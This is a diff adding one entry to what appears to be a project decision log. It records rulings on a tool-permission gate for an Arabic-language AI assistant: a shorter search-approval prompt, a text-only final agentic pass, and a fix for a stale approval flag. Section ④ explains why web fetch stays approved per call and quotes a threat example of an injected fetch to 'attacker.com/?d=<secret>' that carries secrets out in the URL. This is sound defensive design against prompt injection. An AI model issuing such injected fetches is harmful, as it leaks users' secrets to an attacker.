@@ -18822,3 +18822,128 @@ only. It is the only line of AGENTS.md this commit touches.
 - **Untouched:** DEC-97's counter and the retry-family ruling.
 
 ---
+
+## DEC-147 (2026-09-25) — **THREE RULINGS: THE SEARCH REQUEST SHORTENED, THE LAST PASS ALWAYS TEXT, AND A MISS THAT CANNOT OUTLIVE ITS TURN.** One WHY sentence and ONE word for search — reversing DEC-136 ruling ②, whose recorded ground DEC-135 ③ had already refuted · the fetch request NOT shortened, because its path and query are the exfiltration channel · the final pass forced to text, DEC-131's brake applied once more — every cap hit on record was a tool on pass 4 · the stale `missed` flag cleared where DEC-145 ⑨ found it · the model-facing items deferred so the variables stay apart · `AGENTS.md:242` corrected — RULED (Sultan), RECORDED BEFORE THE BUILD so every citation of this entry resolves; **the build follows, one commit per ruling, and Sultan verifies live.**
+
+Sultan's rulings on DEC-146's findings. G1 ran for all three against scratch copies of `c2a7c26`, and none
+breached the ≤300 law. The sections are numbered as the rulings are, so "DEC-147 ②" in the tree names the
+last-pass ruling and nothing else — the defect DEC-144 ② found. `file:N` references are to `c2a7c26`.
+
+---
+
+## ① THE SEARCH REQUEST — ONE WHY SENTENCE AND ONE WORD
+
+**THE RULING (Sultan): the search-scope request becomes one WHY sentence and ONE spoken word; the detector
+keeps accepting all four.** The WHY is DEC-145 ②'s finding: the gate speaks only under taint, so "content
+from sources we do not trust has entered this session" is true every time it is spoken. **Explain WHY,
+never WHAT happened.** The scope stays, rendered from the tool name the grant is held under — `spoken_scope`
+takes the tool and ONE accepted word and nothing else — so what is heard and what is enforced remain one
+scope (DEC-143 ⑦). «وحدها» keeps the bare-word rule in one word.
+
+**MEASURED AT G1, BY VALUE:** from **292 characters** to **157**:
+
+> دخلت هذه الجلسة نصوصٌ من مصادر لا نثق فيها، لذلك تحتاج الأداة «web__search» إذنك، وإذنك يشمل كل
+> استدعاء لها إلى أن تتكلم مرة أخرى. إن أذنت فقل «أوافق» وحدها.
+
+"Content from sources we do not trust has entered this session, so the tool web__search needs your
+permission, and your permission covers every call to it until you speak again. If you permit, say «أوافق»
+on its own." The one word is `APPROVAL_WORD_AR`, the detector's own first word, so the word offered is
+always a word accepted.
+
+**THIS REVERSES DEC-136 RULING ② FOR THE SCOPE SENTENCE — AND THE JUSTIFICATION, Sultan's:** naming ONE
+word cannot cause a refusal for saying the named word; the other three remain accepted as silent tolerance.
+All that is lost is that the user does not learn the variants work, which is not needed. **The
+per-call sentence still names every accepted word:** DEC-136 ② stands there, and a fetch is not shortened
+(④).
+
+**THE PREMISE THE REVERSAL CORRECTS.** DEC-136 recorded that "naming one while accepting three is what
+refused Sultan three turns running" (`DECISIONS.md:16725`, `:16777-16779`). **DEC-135 ③ had already found
+the opposite:** "the detector never saw a bare accepted form" (`:16537`), and the one-word request "is not
+this failure's cause, but it is a real narrowing" (`:16517-16519`) — a bare «موافق» would have matched.
+**Sultan's justification is DEC-135 ③'s own finding.** The same false mechanism — a user "refused for
+saying a word the gate accepts", which the detector cannot do — stands in four derived copies, corrected in
+①'s commit: `AGENTS.md:332`, `confirm_gate_detector.py:83-88`, `confirm_gate_notes.py:37-41` and
+`tests/test_kernel_spoken_request.py:230-233`.
+
+**KNOWN AND DEFERRED:** the model-facing directive still names all four words (`confirm_gate_notes.py:144`),
+so a model that relays (`claude`, DEC-135) would say four where the kernel says one. It is model-facing, so
+it waits with ⑤'s batch.
+
+## ② THE LAST PASS IS ALWAYS TEXT
+
+**THE RULING (Sultan): force `tool_choice="none"` on pass `MAX_AGENTIC_ITERATIONS`, so the model cannot
+start a tool it has no pass left to explain.** It is DEC-131's brake applied to the final pass — a proven
+mechanism, not a new one. It resolves Session 6 directly: three granted searches, then an answer. **Its
+claimed side effect — that the double next-step goes, because the cap is no longer reached — is to be
+VERIFIED in the build, not assumed.** The cap stays at 4 (DEC-111).
+
+**WHERE IT LANDS, MEASURED AT G1.** A THIRD reason in `loop_tool_choice` (`highlight_gate.py:115`), the one
+place `tool_choice` is decided, reading DEC-121's counter `TurnResult.passes_serviced` — the passes ALREADY
+serviced, so this pass is the last once it reaches `MAX_AGENTIC_ITERATIONS - 1`. That counter is on the
+object `consume()` already holds, so the check never reads `orchestrator.py`'s loop index.
+`kernel/turn_pass.py` **stays at 294**: the one call is edited in place. The BOUND must travel: the brake
+compares against `MAX_AGENTIC_ITERATIONS`, which lives in `orchestrator.py`, and the brake's module cannot
+import the orchestrator that imports it. So the constant MOVES to `highlight_gate.py`, re-exported by
+`orchestrator.py` unchanged — `orchestrator.py` **299 → 298**, `highlight_gate.py` **166 → 185**.
+
+**THE DURABLE LOG, AS READ ON 2026-09-25:** 109 turns reached a pass, 11 reached pass 4, and the 8 that
+called a tool there are exactly the 8 `agentic cap (4) hit` lines on record. **Every cap hit on record was
+a tool started on the last pass.**
+
+**THE CONSEQUENCE, RECORDED:** every turn now has at most three TOOL passes — draws, reads, runs and searches
+alike. A draw that would have landed on pass 4 (DEC-111's case) becomes an answer without a draw.
+`AGENTIC_CAP_NOTE_AR` stays as the fallback for a provider that ignores `tool_choice`.
+
+## ③ A MISS CANNOT OUTLIVE ITS TURN
+
+**THE RULING (Sultan): the flag set by a missed approval must not survive into an unrelated later turn.**
+It is fixed where DEC-145 ⑨ found it: `observe()` returns before touching `missed` when nothing is pending
+(`confirm_gate.py:186-190`). **A look that finds nothing pending now clears it** — nothing was asked, so
+nothing was missed — which is exactly the retry note's own precondition (`confirm_gate_notes.py:154-155`).
+G1: `confirm_gate.py` **286 → 289**. DEC-145 ⑨'s reproduction becomes the test, and its «لا» control the
+negative test. The designed case — a miss followed by a refusal in the SAME turn, which the retry note
+exists for — must still return the retry form.
+
+## ④ FETCH IS NOT SHORTENED — THE TENSION
+
+DEC-146 ④(b) would have spoken only the domain. **Sultan declines it.** Fetch is per call because it
+"sends a request to ANY URL, which is the true exfiltration channel … A unified capability grant would
+pre-authorise an injected fetch attacker.com/?d=<secret>" (Sultan's DEC-143 design brief, 2026-09-24) —
+**the secret rides in the path and the query.** DEC-143 ① kept fetch per call, and DEC-138 made the kernel
+speak what it hashes. **Speaking only the domain would hide exactly the part that carries the secret.** A
+domain-scoped grant was never itself proposed or refused in the record; the same ground excludes it.
+
+**Sultan's note: this is rare with Tavily, whose results carry page content** (`tavily.py:91` maps Tavily's
+`content` into each result). **The live checks, so far:** the model called `web__fetch` in three of the four
+research sessions (log `:2054`, `:2163`, `:2201`/`:2232`/`:2253`). Recorded as found, not ruled.
+
+## ⑤ DEFERRED — MODEL-FACING, SO THE VARIABLES STAY APART
+
+Not in this round: **C047's missing exception** for a reply that cannot search (DEC-145 ③) and
+**`CONFIRM_DIRECTIVE_AR`'s false "the user hears nothing"** (DEC-145 ④). Both are model-facing, and both are
+measured by ear in the next live run, so that their effect is never confused with this build's. The
+directive's four-word list (①) joins them.
+
+## ⑥ `AGENTS.md:242` CORRECTED — IN THIS COMMIT, AS AUTHORISED
+
+It still said Phase 4A was "NOT merged, NOT tagged, NOT pushed". **`205d9f5` is an ancestor of
+`origin/main`, and the tag `v4a-code-intelligence-complete` is on the remote** (`git ls-remote`).
+
+## ⑦ THE BUILD, AND WHAT IT MUST PROVE
+
+One commit per ruling, in order ① ② ③, each declaring its guard count and each passing the suite at ≤6
+workers. **Mutation-verified, each asserted APPLIED:** a spoken search request naming more than one word
+goes RED · a pass-4 tool call surviving goes RED · a stale `missed` surfacing a retry note turns later goes
+RED. The dry run at G1 found the tests each ruling flips: four for ①, and for ② and ③ only the declared pins
+and the one guard that pins `turn_pass.py`'s call text.
+
+---
+
+## THE STATE THIS LEAVES
+
+- **RULED AND RECORDED:** ① ② ③ and the tension of ④. The build follows this entry, one commit per ruling.
+- **DEFERRED, and Sultan's:** ⑤'s model-facing items, measured by ear in the next live run.
+- **NEXT:** Sultan verifies live, after the build.
+- **Untouched:** DEC-97's counter and the retry-family ruling; GPT-6 Luna's regression (DEC-143 ⑩).
+
+---
